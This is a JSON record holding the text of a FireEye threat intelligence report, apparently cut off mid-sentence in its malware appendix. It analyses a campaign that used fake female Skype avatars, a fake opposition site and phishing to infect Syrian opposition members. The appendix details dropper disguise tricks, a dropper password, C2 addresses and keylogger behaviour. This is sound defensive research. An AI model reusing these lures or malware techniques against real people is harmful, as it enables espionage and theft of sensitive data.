{
    "id": "90120510-3a1a-4c73-b944-1743f52a7f69",
    "created_at": "2022-10-25T16:48:22.921145Z",
    "updated_at": "2025-03-27T02:16:26.170502Z",
    "deleted_at": null,
    "sha1_hash": "4751fe686fb4e305ef49296f46ac33139114232b",
    "title": "Behind The Syrian Conflict's Digital Front Lines",
    "authors": "FireEye",
    "file_creation_date": "2015-02-01T23:24:29Z",
    "file_modification_date": "2015-02-01T23:24:55Z",
    "file_size": 4628230,
    "plain_text": "S P E C I A L R E P O R T\n\nF I R E E Y E T H R E AT I N T E L L I G E N C E\n###### BEHIND THE\n SYRIAN CONFLICT’S\n DIGITAL FRONT LINES\n\nFEBRUARY 2015\n\n**AUTHORS:**\n\nDANIEL REGALADO\n\nNART VILLENEUVE\n\nJOHN SCOTT RAILTON[1 ]\n\n##### SECURITY\n\n\n-----\n\nFEBRUARY 2015\n\n###### Introduction 3\n\n Key findings 5\n\n I. Data theft: stealing the opposition’s plans 6\n\n II. Victims: serving varied roles in the opposition 9\n\n Victims Located in Syria and beyond 10\n\n III. Tactics: encountering femme fatale 11\n\n Chatting with female avatars 11 Seeding malware on social media 13 A fake Syrian opposition website 13 Social networking profiles and Facebook credential phishing 14 One compromised system, multiple victims 14\n\n IV. Malware: a range of tools for multiple platforms 15\n\n V. Potential threat group sponsorship 16\n\n Lebanon: a recurring theme 17\n\n Conclusion 18\n\n Acknowledgements 18\n\n Appendix A: malware analysis 19\n\n Multi-stage self-extracting RAR dropper 19 ONESIZE Keylogger 21 BLACKSTAR, a custom dropper for the DarkComet RAT 24 YABROD downloader and CABLECAR launcher 26 Detailed analysis 27 Python-based backdoor shellcode launcher 28 Android backdoors 30 Malware samples 34\n\n1\n\n\n-----\n\n## IN MID-2013,\nten armed units working in opposition to Syrian They shared photocopied battle plans and in red\nPresident Assad’s regime were planning a major ballpoint pen added defensive berms, saving\noperation intended to push a front forward their plans electronically as pictures. They\nagainst the Syrian government’s forces. They planned for a battle involving between 700 and\ncarefully laid out their objective—take and hold a 800 opposition forces, who were divided into\nseries of positions and liberate the town of Khirbet groups to launch separate attacks, including an\nGhazaleh, a strategic gateway to the major city of ambush. They mapped out locations for reserve\nDaraa. They used Google Earth to map their fighters, staging areas, and support personnel,\ndefensive lines and communicate grid coordinates. settled on a field operations area, and planned\n\nsupply routes to resource their forces. They\nsternly told commanders of each unit that they\ncould make no ‘individual’ decisions without the\napproval of the Operations element.\n\n\n-----\n\n## THEY WOULD BEGIN\n\nthe attack with a barrage of 120mm mortar fire, followed by an assault against key regime troop locations.\nThey drew up lists of men from each unit, with names, birthdates, and other identifying information. They\nused formulas in a colorful Excel spreadsheet to calculate per-man ammunition needs. They arranged and\nassigned heavier weapons to various engagements: several tanks, a BMP fighting vehicle, 14.5mm and\n23mm anti-aircraft guns, B-10 82 mm recoilless rifles, Yugoslav 90mm M79 Osa anti-tank weapons and\nother equipment.\n\nFinally, they prepared and staffed medical teams and battlefield ambulances. They would have a driver,\nstretcher-bearer, and two armed elements for additional support.\n\nWe uncovered these battle plans in the course of To undertake this operation, the threat group\nour ongoing threat research. It quickly became employed a familiar tactic: ensnaring its\napparent that we had come across stolen victims through conversations with seemingly\ndocuments containing the secret communications sympathetic and attractive women. A female\nand plans of Syrian opposition forces that had avatar would strike up a conversation on Skype\nfallen victim to a well-executed hacking operation. and share a “personal” photo with her target.\nBetween at least November 2013 and January Before sending the photo she typically asked\n2014, the hackers stole a cache of critical which device the victim was using—an Android\ndocuments and Skype conversations revealing the phone or a computer—likely in an effort to send\nSyrian opposition’s strategy, tactical battle plans, appropriately tailored malware. Once the target\nsupply needs, and troves of personal information downloaded the malware-laden photo, the threat\nand chat sessions belonging to the men fighting group accessed his device, rifled through files and\nagainst Syrian President Bashar al-Assad’s forces. selected and stole data identifying opposition\nWhile we do not know who conducted this hacking members, their Skype chat logs and contacts, and\noperation, if this data was acquired by Assad’s scores of documents that shed valuable insight\nforces or their allies it could confer a distinct into military operations planned against President\nbattlefield advantage. Assad’s forces.\n\n\n-----\n\n###### KEY FINDINGS\n\nTACTICS AND POTENTIAL\n\nDATA THEFT VICTIMS TECHNIQUES MALWARE SPONSORSHIP\n\nThe threat group Targeted individuals The threat actors used The threat group While we have only\nstole hundreds of included armed female Skype avatars to employed a diverse limited indications\ndocuments and some opposition members, chat with their targets malware toolset that about the origins of\n31,107 logged Skype media activists, and infect their devices implied access to this threat activity,\nchat sessions that humanitarian aid with malware. “She” development resources. our research revealed\nincluded discussions workers, and others. typically asked her They used both widely multiple references to\nof plans and logistics The victims are located intended victim if he available and custom Lebanon both in the\nof the Syrian in Syria, the region was using Skype on an malware to breach course of examining\nopposition’s attacks and beyond. Android or a computer, their targets, including the malware and in\non Assad’s forces. in a likely attempt to the DarkComet RAT, a the avatar’s social\n\nsend malware tailored customized keylogger, media use.\nto the device. The and tools with different\nthreat group also shellcode payloads.\nmaintained a seemingly\npro-opposition website\ncontaining links to\nmalicious downloads\nand Facebook profiles\nwith malicious links as\nwell. They conducted\nthese operations using\nservers located outside\nof Syria.\n\n\n-----\n\n###### I. DATA THEFT: STEALING THE OPPOSITION’S PLANS\n\n\nhe threat group amassed a significant\namount of data, from Skype account\ndatabases to planning documents and\n\n###### T\n\nspreadsheets to photos. The victims created the\nmajority of the data from May 2013 to December\n2013. Some of the stolen Skype databases\nincluded chat history going back to 2012 and\nactivity as recent as January 2014. The threat\n\n###### TYPES OF STOLEN INFORMATION\n\n\ngroup chose what it stole carefully, there were\nonly a few instances where the group downloaded\nmovies, empty files, end user licensing\nagreements, baby pictures, school papers, and\nother seemingly extraneous material. We have\nsummarized the major types of information\ncontained in the stolen data in the table below:\n\n|MILITARY INFORMATION • Conversations and documents planning military operations • Details on military hardware and positions of fighting groups • Names of members of fighting groups and their weapons systems|POLITICAL INFORMATION • Political strategy discussions • Political tracts, manifestos, and alliances within the opposition|HUMANITARIAN ACTIVITIES AND FINANCING • Humanitarian needs assessments • Lists of materials for the construction of major refugee camps • Humanitarian financial assistance disbursement records|REFUGEE PERSONAL INFORMATION • Applications for assistance by refugees to authorities in Turkey • Lists of aid recipients, scans of ID cards|MEDIA AND COMMUNICATIONS • Documents and strategy information pertaining to media releases • Situation reports and lists of casualties • Information about rights abuses|\n|---|---|---|---|---|\n\n\n-----\n\n###### STOLEN DATA\n\n#### 7.7 GBOF STOLEN DATA\n###### 31,107\n CONVERSATIONS\n SKYPE ACCOUNT\n\n# 64DATABASES\n\n#### 12,356CONTACTS\n 240,381 MESSAGES\n\n\n###### MILITARY INFORMATION\nThe threat group took a range of military-related\ninformation, and seemed to pay special attention\nto files that contained lists of names. We found\ndozens of lists identifying hundreds of fighters\nserving in armed opposition groups. Some lists\nincluded names and birthdates, while others noted\nthe weapons and serial numbers each man carried,\ntheir blood types, and their phone numbers.\n\nThe threat group also stole lists of officers\nin Assad’s forces, and pictures of suspected\nHezbollah operatives captured or killed inside\nSyria, as well as pictures of fighting-age men with\nweapons and in irregular uniforms posing for the\ncamera or exploring battle damaged towns.\n\nSometimes, the threat group would take whole sets\nof files pertaining to upcoming large-scale military\noperations. These included correspondence,\nrosters, annotated satellite images, battle maps,\norders of battle, geographic coordinates for\nattacks, and lists of weapons from a range of\nfighting groups.\n\nWe identified records of the number of Kalashnikovs\nand light machine guns taken, materials found, and\ncasualties suffered during operations. One such\nreport describes capturing a warehouse filled\nwith chemical weapons protective equipment,\nsuits, cleaning products, and possibly antidotes.\nThe report did not mention whether any chemical\nagents were found.\n\n\nThe threat group also took Skype chat logs, in\nwhich mundane conversations often transitioned\ninto sensitive communications about strategy,\nlogistical issues, and supply routes, and frank\nassessments of recent engagements with the\nenemy. In one chat, opposition members discuss\nthe movement of a shipment of 9M113 TOW\nmissiles and launchers, and agree upon a time\nand location to handover the weapons.\n\n###### POLITICAL INFORMATION\nThe Skype chat logs likely provided the threat\ngroup with an inside view into the politics of\nthe Syrian opposition, as individuals discussed\ncoalitions, criticized people, and shifted alliances.\nIn addition to the Skype logs, the threat actors\nalso stole a large number of documents detailing\nopposition political structures, including the\nformation of political parties, political support,\nand shifting allegiances in the diaspora.\n\n###### HUMANITARIAN ACTIVITIES\n AND FINANCING\nThe threat actors also stole a wide range of\nmaterial concerning humanitarian activities in\nSyria and bordering countries. These included\nmany lists of humanitarian needs, such as perfamily lists of blanket and mattress distribution in\nrefugee camps. The threat actors stole records of\nfinancial assistance, and money sent per-month\nto opposition groups within the country.\n\n\n-----\n\n###### MAP OF SYRIAN OPPOSITION BATTLE PLANS\n\n\nOpposition battle\nplans were stolen\nthat included\ninformation about the\nemplacements of antigovernment forces.\nThe stolen plans are\nhigh-value artifacts\nthat may have\nprovided actionable\nmilitary intelligence\nto the recipients. This\nredacted map shows\npart of an attack plan\nagainst Assad's forces\nmilitary encampment\n(red rectangle).\n\n\n###### The threat group stole data such as personal updates, lists of casualties, and documents discussing investigations into the use of chemical weapons.\n\n\n###### REFUGEE PERSONAL INFORMATION\nWe also found that the threat actors had stolen\ninformation pertaining to Syrian refugees in Turkey\nand elsewhere. Refugees must provide a range of\ndocumentation to the relevant authorities in order\nto receive benefits from the host country. The\nthreat group had obtained filled-out applications\nfor assistance and education, and even the scanned\nID cards of refugees and their CVs. We found\nphotos depicting Syrian families in Turkish refugee\ncamps, and children next to cars in temporary\nrefugee housing.\n\n\n###### MEDIA AND COMMUNICATIONS OPERATIONS\nSeveral of the threat group’s victims engaged in\nmedia activities on behalf of the revolution. The\nthreat group stole data such as personal updates,\nlists of casualties, and documents discussing\ninvestigations into the use of chemical weapons. In\nsome cases, the threat actors also stole composite\nimages of fighters killed in battle, as well as the\noriginal photographs from which they were taken.\n\n###### CREDENTIALS\nThe threat group also obtained user account\ninformation, possibly to continue monitoring the\nopposition’s communications. The threat actors\ncollected Facebook account information through\nthe use of a fabricated login page, and believe that\nthey relied on Remote Access Trojans (RATs) and\nextensive keylogging to obtain credentials as well.\n\n\n-----\n\n###### II. VICTIMS: SERVING VARIED ROLES\n IN THE OPPOSITION\n\ne analyzed the stolen Skype databases\nto find out what roles the victims\nserved in the opposition and to\n\n###### W\n\nunderstand the connections between the victims.\nFirst, we scanned the contents of the victims’ chat\nlogs to identify other victims. We then surmised\nthat the number of shared contacts between\n\n\nthe Skype accounts illustrated the relationships\nbetween victims. We were also able to ascertain\nmore about the victims’ roles and work from the\nchat logs. For further explanation, see Appendix B:\nSocial Media Analysis of Victim Skype Databases.\n\nProfiled below are four sample victims:\n\n|AN OPPOSITION LEADER The threat group compromised the computer of an individual who appears to be the leader of an armed unit. In addition to stealing Skype conversations about sensitive military and logistics topics, the threat actors also took a series of folders marked “Very Special File” that contained plans and logistics information for an upcoming battle.|A DEFECTOR This victim appeared to be a high-profile defector; a formerly high-ranking officer in Assad’s security services. The threat group took multiple files from his computer, including documents on forming armed coalitions and political groups and his complaints to the local Internet Service Provider about the bad service in his new home. While the threat actors had not taken Skype logs from his computer, they did take his CV and other personal documents.|A HUMANITARIAN Several victims appeared to be individuals working on supplies and humanitarian operations, including an aid coordinator for a charity based in Turkey. Among the documents stolen from his system were his CV and a picture of a border crossing showing bundles of goods passing across a river (possibly the Orontes River near Idlib).|A MEDIA ACTIVIST The threat group targeted a young media activist who appeared to be based inside Syria, working with a local media center. The threat group compromised his computer, stealing meeting minutes, as well as a series of videos that recorded meetings with other media activists. They also took lists of casualties and documents pertaining to investigations of chemical weapon attacks.|\n|---|---|---|---|\n\n\n-----\n\n###### TURKEY\n 12\n +\n UKRAINE\n SYRIA 1\n 29\n\n LEBANON\n 1\n\n +\n JORDAN\n 3\n\n EGYPT\n 2 UNKNOWN\n +\n 13\n\n UAE\n +\n 2\n\n**Figure 1: Geographic Location of Victims based on**\n###### SPAIN Victim’s Skype profiles\n\n VICTIMS LOCATED IN SYRIA\n\n### 1 AND BEYOND\n\n###### +\n\nAmong the victims were individuals who\nappear to be linked to the Free Syrian Army\n(a set of groups united by their opposition\nto Assad), Islamist fighting groups, and\nindividuals with no clear group affiliation.\nSome of the victims appear to operate within\nopposition-controlled areas of Syria, while\nothers are more likely located within the\nbroader diaspora networks in Lebanon,\nJordan, and the Persian Gulf.\n\n\n-----\n\n###### III. TACTICS: ENCOUNTERING FEMME FATALE\n\n\nhe threat group primarily compromised its\nvictims using female avatars to strike up\nconversations on Skype and connect on\n\n###### T\n\nFacebook. They also used a fake, pro-opposition\nwebsite seeded with malicious content.\n\n###### CHATTING WITH FEMALE AVATARS\nThe threat group created several Skype accounts\nwith female avatars to target (male) individuals in\nthe Syrian opposition. The female avatars, which had\ngeneric but country-appropriate names and profile\nimages, would develop a rapport with the victim\nbefore sending a malicious file. The female avatars\napproached their targets with a series of personal\nquestions that appeared to be part of a script\n\nThe first two questions would generally be:\n\n“how are you on Skype?\nOn a computer or on your phone?\n\nMonday 20:14\n\nand\n\n\nWe believe the first question about the victim’s\nSkype access determined whether the victim\nreceived malware designed to compromise a\ncomputer or a mobile device.[2] The avatar would\nrequest a photo of the target, then send a “personal\nphoto” of a woman in return. The avatar’s “photo”\nwas actually an executable file (a self-extracting\nRAR archive) renamed with the .pif file extension.[3]\nWhen the victim “opened” the photo, a woman’s\npicture was displayed while the SFXRAR executed\nand ultimately installed the DarkComet RAT in\nthe background. From this point on, the victim’s\ncomputer was under the threat group’s control.\n\nThe other personal questions presumably\nhelped the threat actors systematically collect\ninformation from each of their targets. The threat\nactors would sometimes reinitiate chat sessions\nwith victims after a period of inactivity to collect\nadditional details. For example, we observed a\nfemale avatar engage one victim in lengthy chats\nabout Syrian refugees in Beirut. After successfully\ncompromising the target, the conversations\nstopped. Later “she” briefly re-emerged to ask the\nvictim if he had previously served in the Syrian\nArab Army (Assad’s forces). After getting an\naffirmative answer, she again went silent.\n\n\n2 While we did not see the threat actors deploy Android malware via Skype, they had access to Android malware (see Appendix A) that could have been used in\n\na similar fashion.\n\n3 https://www microsoft com/resources/documentation/windows/xp/all/proddocs/en-us/windows pif create mspx\n\n\n-----\n\n###### A REPRESENTATIVE CHAT WITH “IMAN”[*]\n\n**AVATAR**\n\nThe target receives an AVATAR\ninitial contact request\nfrom the female avatar. He Are you opening Skype on your mobile? **14:27**\naccepts the request. “She”\nthen asks, “are you using\n\nTARGET\n\nSkype on your phone or\nyour PC?”\n\nComputer and mobile **14:35**\n\nTARGET\n\nHow old are you? **14:41**\n\nAVATAR\n\n25 **14:42**\n\nAVATAR\n\nAnd you? **14:43**\n\nTARGET\n\nWhat is your date of birth? **14:45**\n\nThe avatar responds with\na request for a picture. AVATAR\nThe target then sends a\npicture, which the avatar 10-3-88 **15:04**\ncompliments. “She” follows\nup with a request for his\nage and says her own TARGET\nbirthdate. He replies with\napparent surprise that they Lolololololol **15:05**\nhave identical birthdays,\nthough one year off.\n\nTARGET\n\n10-3-89….. **15:06**\n\nIt probably wasn’t a\ncoincidence. His birthday is\non his Skype profile, which AVATAR\nwould have been visible to\nthe threat actor. What a nice coincidence **15:07**\n\nAfter they chatted a bit\n\nTHREAT ACTOR:\n\nmore, she explained that\nshe is a “computer engineer\n\nSent file New-Iman-Picture.pif **15:37**\n\nworking at a programming\ncompany in Beirut” and\nsends a file that the avatar TARGET\nclaims is a picture of her.\n\nYou drive me crazy. **15:39**\n\nThe target becomes a victim\nwhen the picture is opened.\n\n###### SEND\n\n\n-----\n\n**Figure 2: The Skype avatar’s corresponding Facebook profile** **SEEDING MALWARE ON SOCIAL MEDIA**\n\nThe Skype avatar had a matching Facebook profile\nwith the same photo. “Her” profile, populated with\npro-opposition content, contained many posts\nwith malicious links. The links invite visitors to\ninstall security tools like VPNs and Tor, or access\nimportant documents.\n\n###### A FAKE SYRIAN OPPOSITION WEBSITE\nThe malware that the Skype avatars and social\nmedia profiles encouraged their victims to\ndownload shared the same host server as malware\n\n**Figure 3: Another female avatar posting malware links** distributed through a website (80.241.223.128)\non her Facebook profile purporting to be supportive of the Syrian\n\nopposition. The threat actors used this website\nto target opposition members interested in\nnews about the conflict. Much of the websites’\ncontent was scraped from the website of the\nSyrian American Council, a U.S.-based non-profit\nthat advocates for democracy in Syria. In order\nto watch videos on this website, the viewer is\nprompted to download a Flash Player update that\nis actually malware (see Figure 4 and Figure 5).\n\nThreat actors also included download prompts\nfor legitimate video chat software bundled\nwith malware.\n\n**Figure 4:** **Figure 5:**\nPrompt to install Saving malicious\nthe malware flash installer\n\n\n-----\n\n**Figure 6: Fake Facebook login page**\n\n###### SOCIAL NETWORKING PROFILES AND FACEBOOK CREDENTIAL PHISHING\nThe fake opposition website also includes what\nappears to be a matchmaking section (Figure 6)\nthat covertly channels targets toward installing\nmalware. This section of the site contains\nwomens' profiles, each of which is populated with\ninformation indicating age, location and interests\nas well as other personal information. The profiles\nalso contain links to a “LiveCam ID” as well as the\n“Facebook Profile” of each woman. Clicking on the\n“LiveCam ID” link directs the user to a download\npage including Live-Chat-ooVoo-Setup.exe, a\nmalicious bundling of ooVoo (a legitimate program).\nClicking on a Facebook profile links to a fake\nFacebook login page that is actually a phishing page\nused to collect credentials (Figure 7).\n\n###### ONE COMPROMISED SYSTEM,\n MULTIPLE VICTIMS\nThe threat group manually created a directory\non its server for each compromised computer.\nThese directories often contained multiple stolen\nSkype databases indicating that the victims shared\ncomputers. The threat group was likely able to\nacquire large collections of data by breaching only\na relatively small number of systems due to the\nopposition’s use of shared computers for satellitebased Internet access.\n\n\n**Figure 7: Profiles in the phishing site**\n\nSharing computers is likely a function of the\nrealities of limited internet service in Syria. The\nmulti-day Internet and phone blackouts that\nbegan occurring in Syria in 2012 (possibly the\nSyrian government’s attempts to stifle opposition\nforces’ communication capabilities, with some\nexceptions[4]) have driven opposition groups, media\nactivists, political groups, and others to set up\ntheir own satellite communications systems for\nreliable two-way satellite Internet connectivity.\nTypically, they use 2-way satellite communications\nequipment known as Very Small Aperture\nTerminals (VSATs) connected to consumer grade\nnetworking equipment, like Wi-Fi routers. VSATs\nprovide an expensive Internet lifeline to many\ngroups within opposition-controlled parts of Syria.\n\nDue to expensive bandwidth, limited electricity,\nsetup time, and the need to operate VSATs from\na fixed location, individuals supporting a wide\nvariety of Syrian opposition efforts often share\nconnections and computers located in places like\nlocal media centers and operations rooms.[5 ]As\na result, a threat actor who successfully infects\none person on a shared device can easily steal the\nSkype databases and stored documents of several\ntargeted individuals or organizations as well.\n\n\n###### The threat group was likely able to acquire large collections of data by breaching only a relatively small number of systems due to the opposition’s use of shared computers for satellite-based Internet access.\n\n4 http://www.washingtonpost.com/blogs/worldviews/wp/2012/11/30/can-u-s-communication-kits-help-syrians-get-around-the-Internet-blackout/\n\n5 http://www.cbsnews.com/news/to-fight-assad-syrian-opposition-logs-on-at-any-cost/\n\n\n-----\n\n###### IV. MALWARE: A RANGE OF TOOLS\n FOR MULTIPLE PLATFORMS\n\nhe threat group’s tools and tactics differ\nsomewhat from those observed in previous\nactivity targeting the Syrian opposition.[6]\n\n###### T\n\nAlthough this threat group uses the known tactic\nof deploying the DarkComet RAT, they do so using\na multistage dropper that has not been previously\nobserved. The group also uses a keylogger and what\nappear to be custom tools with shellcode payloads.\n\nThe threat actors have used these tools in\nconjunction with techniques such as:\n\n\nThis is also the first instance we have observed a\nthreat group targeting the Syrian opposition using\nAndroid malware. Smart phones, in general, are\nvaluable sources of data about individuals and their\nsocial networks, as they may contain address books,\nSMS messages, email, and other data (including data\nfrom mobile apps, such as Skype). Targeting Android\nmay be particularly beneficial in the case of Syrian\nopposition members, where regular power blackouts\nin Syria may force people to rely more heavily on\nmobile devices for communications.\n\nDespite the wide array of tools and techniques at\ntheir disposal, the threat group does not appear to\nuse software exploits to deliver malware to their\ntargets. Instead, they seem to rely on a variety of\nsocial engineering techniques to trick victims into\ninfecting themselves.\n\n###### Although this threat group uses the known tactic of deploying the DarkComet RAT, they\n do so using a multistage dropper that has not been previously observed.\n\n\n6 See, for example: https://www.eff.org/document/quantum-surveillance-familiar-actors-and-possible-false-flags-syrian-malware-campaigns;\n\nhttps://securelist.com/files/2014/08/KL_report_syrian_malware.pdf; https://citizenlab.org/2014/12/malware-attack-targeting-syrian-isis-critics/\n\n\n-----\n\n###### V. POTENTIAL THREAT GROUP SPONSORSHIP\n\nhe threat group’s tools and tactics stand in\ncontrast to the ways in which other Syrian\ngroups (described publicly by a variety of\n\n###### T\n\nresearchers) have operated. In addition, while we\ndo not have sufficient information to determine\nthe identity of this group or the nature of its ties\nto Assad’s forces, we have some indications that\nthe group may be resourced and / or located\noutside of Syria.\n\nThe malware used by this threat group does\nnot share any command and control servers\nwith previously reported activity documented\nby research groups including Kaspersky, Trend\nMicro, CitizenLab, and the Electronic Frontier\nFoundation (EFF).[7] In addition, the activity does\nnot share any of the tactics or tools with activity\nprofiled in another recently released report on\npotentially ISIS-linked malware in Syria.[8]\n\n\nThe threat group used a variety of malware,\nsuggesting access to development tool resources.\nFor example, while other Syrian threat groups have\nused DarkComet and other RATs extensively, this\ngroup deploys DarkComet using a custom dropper\n(BLACKSTAR) that may make the malware more\ndifficult to detect. This threat group is also unique\nto date in leveraging the Metasploit Framework,\ncustom malware tools (YABROD and CABLECAR),\nand Android malware. This demonstrates that\nthe threat group is capable of acquiring and using\na diverse malware arsenal. It remains unclear if\nthey have developed this capacity internally or are\nreceiving outside support.\n\nFinally, public reports of other suspected proSyrian threat actors have identified those groups’\nprimary or fallback command and control (C2)\nservers as located within Syria itself (e.g., resolving\nto or directly referencing Syrian IP addresses,\noften in similar IP ranges.) However, this group’s\nC2 servers were located outside of Syria. This may\nindicate that the group is not based in Syria itself,\nor that its sponsor’s resources do not include\nthe ability to provide the group with dedicated\nservers located in Syria.\n\n\n7 https://www.eff.org/document/quantum-surveillance-familiar-actors-and-possible-false-flags-syrian-malware-campaigns\n\nhttps://securelist.com/files/2014/08/KL_report_syrian_malware.pdf\n\n8 https://citizenlab org/2014/12/malware-attack-targeting-syrian-isis-critics/\n\n\n-----\n\n**Figure 8: Avatars**\nreferencing Lebanon\n\n###### LEBANON\n\n**BEIRUT**\n\n###### LEBANON: A RECURRING THEME While researching the threat group’s\nWhile researching this activity, we came tactics, we came upon a reference to a\nacross numerous references to Lebanon. 3-day training course in Lebanon in 2012\nWe observed a user in Lebanon upload that described the use of eerily similar\nwhat appear to be two test versions methods. According to media reports, a\nof malware used to target opposition leaked Syrian intelligence memo titled\nelements (the YABROD downloader and \"Training Course for Internet and Social\nthe CABLECAR launcher). The avatars, Media Activists\" describes the tactics that\nsocial media seeding, and fake opposition pro-Assad recruits—many of whom were\nwebsite are also filled with references Lebanese members of Hezbollah's Islamic\nto Lebanon. During chats, for example, the Resistance—were trained to use.[9] Do\nfemale avatars often state that they are in note that we are unable to determine the\nLebanon and demonstrate familiarity and authenticity of the document, or whether it\ninterest in talking about issues there. Social may represent disinformation.\nmedia pages suggest that the avatars are\nrefugees in the country, or are Lebanese. The training included:\n\n\nEstablishing an \"Electronic Army\" to infiltrate\nSyrian activists’ computers, websites and\nInternet accounts, and attempting to use\nstolen personal information against them.\n\n\nSetting up opposition social media accounts\nto spread false information and make\naccusations and counter-accusations\nto create conflict between opposition\nmembers in and out of Syria.\n\n\nThe use of women to entrap opposition\nmembers and activists using social media\nsites such as Skype and Facebook.[10]\n\n\n9 http://alkhaleejonline.net/#!/articles/1414221806705481300/, English translation available here: http://syria-cyber-warfare-intel-leak.pen.io\n\n\n-----\n\n###### CONCLUSION\n\nt first glance, this group’s activity follows\na familiar plot line: threat actors socially\nengineer their way into individuals’\n\n###### A\n\ncomputers and then steal data. However, like all\ngreat plots, this one comes with a twist. The group\nregularly asked its targets about the device they\nused—computer or Android phone—probably so\nthat they could then deploy malware specifically\ntailored to that device. In addition to the range\nof military and political documents stolen, the\ngroup focused on the victim’s Skype databases,\nwhich included the victim’s contacts and real time\ncommunications, providing the threat actors with\nan inside view into the opposition’s relationships\nand plans. We suspect they often found their next\ntargets in the victim’s Skype contacts as well. As\nthe warzone reality of expensive satellite internet\nforced opposition members to rely on shared\ndevices, compromising a single device yielded the\ncombined plans and communications of multiple\naspects of the opposition.\n\n\nUnlike other threat activity that we have profiled,\nthis is not just cyber espionage aimed at achieving\nan information edge or a strategic goal. Rather,\nthis activity, which takes place in the heat of a\nconflict, provides actionable military intelligence\nfor an immediate battlefield advantage. It provides\nthe type of insight that can thwart a vital supply\nroute, reveal a planned ambush, and identify and\ntrack key individuals. This intelligence likely serves\na critical role in the adversary’s operational plans\nand tactical decisions. However, this tactical edge\ncomes with a potentially devastating human cost.\n\n###### ACKNOWLEDGEMENTS\nKristen Dennesen\nLaura Galante\nWilliam Gibb\nErye Hernandez\nMary Beth Lee\nNed Moran\nVinay Pidathala\nMichael Shoukry\nJen Weedon\nJinjian Zhai\n\n\n-----\n\n###### APPENDIX A: MALWARE ANALYSIS\n\n MULTI-STAGE SELF-EXTRACTING RAR DROPPER\nThis threat group frequently uses social engineering to attempt to trick victims into infecting themselves\nby running malware disguised as a legitimate file, which we call the “lure”. In some cases the file appeared to\nbe valid software installation program (e.g.,install_flashplayer11x32_gdrd_aih.exe). In other cases,\nthe group used the non-printable Unicode right-to-left override character[11] to make executable files appear\nas PDFs, JPGs, or other non-malicious content (e.g., Syrian-Girl-Against-Regime[Unicode]gpj.exe.,\nwhich would be displayed to a user as Syrian-Girl-Against-Regime.exe.jpg).\n\nIn each case, the “lure” file was actually a self-extracting RAR archive (SFXRAR), typically containing a decoy\nfile and a second, password-protected SFXRAR that contained the actual malware. The files are executed to\ndeploy the malware as shown in Figure 9.\n\n**Figure 9: Multi-stage RAR Dropper**\n\n**1** **2**\n\nExtract RAR1 Dropper\nand run installer Run dropper\n\n###### Download binary\n Installer Provide RAR 2\n RAR 2\n\nPassword\n\n###### RAR 1\n Malware Installer\n\n Decoy Show\n Extract\n Run\n\nDecoy RAR 2 Malware\n\n**3** **4**\n\n###### Dropper\n\n System\n\n RAR 2\n Infection\n\n Malware\n\n11  http://blogs.msdn.com/b/ericfitz/archive/2011/08/22/off-topic-unicode-right-to-left-override-character-used-by-malware.aspx\n\n\n-----\n\n1. The “lure” is a SFXRAR archive (“RAR 1”) that contains one or more installer batch (.bat) scripts\nand / or Visual Basic (.vbs) scripts (generically referred to as the “Installer”, above); a non-malicious\ndecoy file (Word or PDF document, JPG image, or legitimate software installation program, the\n“Decoy”); and a second, password-protected SFXRAR archive containing the malware (the “Dropper”\n/ “RAR 2”). Since the malware is in a password-protected file, it can’t be scanned by antivirus\nsoftware. In step 1, RAR 1 executes, writes its contents to disk, and launches the installer scripts.\n\n2. When the installer scripts execute, they provide a password to open RAR 2 and launch the decoy file.\n\n3. The decoy file is displayed to the victim (or executed, if the decoy is a legitimate application).\n\n4. The malware is extracted from the password-protected RAR 2 and executed, compromising the system.\n\nFor example, visitors attempting to view videos on the threat group’s fake website\nwere prompted to download the file install_flashplayer11x32_gdrd_aih.exe\n(6608ce246612d490f3b044627a5e6d9e). While the file appeared to be an installation program for\nAdobe Flash, it was actually an SFXRAR archive containing the files shown in Figure 10.\n\nThe file flashplayer11.exe (b44da59fdaf10fea8bce51772f67b9a9) was the “decoy”\nfile – a legitimate, digitally-signed Adobe binary. The file Update-flashplayer11.sfx.exe\n(a1e0d40715f66f30aad44ab4c15a474a) was a password-protected SFXRAR file. The BBAG.bat file\nextracts and launches the SFXRAR using the password “Wh@t1sTh3re” on the command line and launches\nthe decoy to start the legitimate Flash player installation process, as shown in Figure 11.\n\nThe SFXRAR in turn extracts and executes the malicious file flashplayer11x32_gdrd_aih.exe\n(b68a7e216cb0d18030048935b67e0d68) which is a copy of the ONESIZE keylogger.\n\n\n-----\n\n###### ONESIZE KEYLOGGER\nONESIZE has been distributed using the multi-stage SFXRAR dropper method described above. ONESIZE\nuses the GetAsyncKeyState API to intercept input from the keyboard. The malware stores logged keystrokes\nto %temp%\\keys.txt. A sample log file is shown in Figure 12:\n\nONESIZE collects information about the infected computer, including the hostname, OS name, registered\nowner, install date, system type, BIOS version, system and input locale (to detect the language), domain,\nlogon server, and hotfixes installed. The system information is transmitted to a hard-coded command and\ncontrol (C2) server (80.241.223.128:2007), as shown in Figure 13:\n\n\n**Figure 13: System information sent to the ONESIZE C2**\n\nconnect to [80.241.223.128] from Lab-PC\n\n[80.241.223.128] 49232\n\nHost Name: LAB-PC\nOS Name: Microsoft Windows 7 Professional\nOS Version: 6.1.7601 Service Pack 1 Build 7601\n\nOS Manufacturer: Microsoft Corporation\nOS Configuration: Standalone Workstation\nOS Build Type: Multiprocessor Free\nRegistered Owner: Lab\nRegistered Organization:\n...\n\n\nONESIZE also uploads the key log file to the same C2 server. ONESIZE checks to see whether the current\nkey pressed is greater than 0x26 and less than or equal to 0x5A, or any of the following virtual keys:\n\nVK_OEM_COMMA\nVK_OEM_2\nVK_OEM_3\nVK_OEM_4\nVK_OEM_5\nVK_OEM_6\nVK_OEM_7\n\n\n-----\n\nIf so, and if the key log file is equal to or greater than 4096 bytes (0x1000) in size, the log is uploaded to the\nC2 server. If these conditions are not met, then the current key pressed is simply written to the log file.\n\nONESIZE may leverage source code[12] from the publicly available UniLogger Keylogger.[13] UniLogger\nsupports Unicode, which means it is capable of logging keystrokes from keyboards configured for Unicode\nlanguages such as Arabic, Chinese, and Russian.\n\nBoth ONESIZE and UniLogger may use the same source code to record keystrokes. Figure 14 shows part\nof the UniLogger source code, which calls Sleep with the rand function somewhat uniquely and searches\nvirtual-key codes from 8 to 222.[14] Figure 15 shows a partial disassembly of ONESIZE; the Sleep and rand\nfunctions are visible, as well as the virtual key codes from 8 to 222.\n\n**Figure 15: ONESIZE partial disassembly**\n\n12 https://github.com/SherifEldeeb/UniLogger/blob/master/Source.cpp\n\n13 http://eldeeb.net/wrdprs/?page_id=229\n\n14 The malware determines if a key is pressed by iterating through all the virtual keys starting from 